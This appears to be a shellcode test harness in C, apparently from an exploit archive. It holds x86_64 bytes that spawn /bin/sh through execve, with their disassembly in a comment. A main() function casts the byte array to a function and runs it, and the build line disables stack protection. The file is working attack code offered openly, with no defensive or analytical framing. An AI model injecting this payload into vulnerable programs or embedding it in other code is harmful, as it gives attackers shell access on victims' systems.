/* Linux x86_64 Shellcode
 * execve('/bin/sh')
 * file format elf64-x86-64
 * gcc -z execstack -fno-stack-protector shellcode.c -o shellcode
Disassembly of section .text:
0000000000400080 <SysExecve>:
  400080:       5f                      pop    %rdi
  400081:       48 31 c0                xor    %rax,%rax
  400084:       48 89 c6                mov    %rax,%rsi
  400087:       48 89 c2                mov    %rax,%rdx
  40008a:       b0 3b                   mov    $0x3b,%al
  40008c:       0f 05                   syscall

000000000040008e <_start>:
  40008e:       e8 ed ff ff ff          callq  400080 <SysExecve>
  400093:       2f62696e2f7368          ASCII '/bin/sh'
 */


#include<stdio.h>
#include<string.h>

unsigned char payload[] =
"\x5f"
"\x48\x31\xc0"
"\x48\x89\xc6"
"\x48\x89\xc2"
"\xb0\x3b\x0f\x05"
"\xe8\xed\xff\xff\xff"
"\x2f\x62\x69\x6e"
"\x2f\x73\x68";

void main() {
	printf("Shellcode Length: %d\n", (int) strlen(payload));
	(*(void (*)()) payload)();
}
